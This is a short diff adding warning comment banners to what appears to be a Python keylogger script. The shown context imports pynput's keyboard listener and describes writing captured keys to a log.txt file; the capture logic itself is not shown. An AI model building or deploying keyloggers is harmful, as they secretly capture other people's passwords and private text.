@@ -1,3 +1,10 @@
+                  #!!!!!!!!!!!!!!!! IT'S JUST SIMPLE KEYLOGGER!!!!!!!!!!!!!!!!!!
+   #!!!!!!!!!!!!!!!!!! IT CAN BE DETECTED BY WINDOWS DEFENDER SO IT'S NOT HANDY !!!!!!!!!!!!!!!!!!
+
+
+
+
+
 #Importing keyboard module from pynput
 from pynput.keyboard import Key,Listener
 #Creating a counter for each 10 letter we will print out a log.txt file.
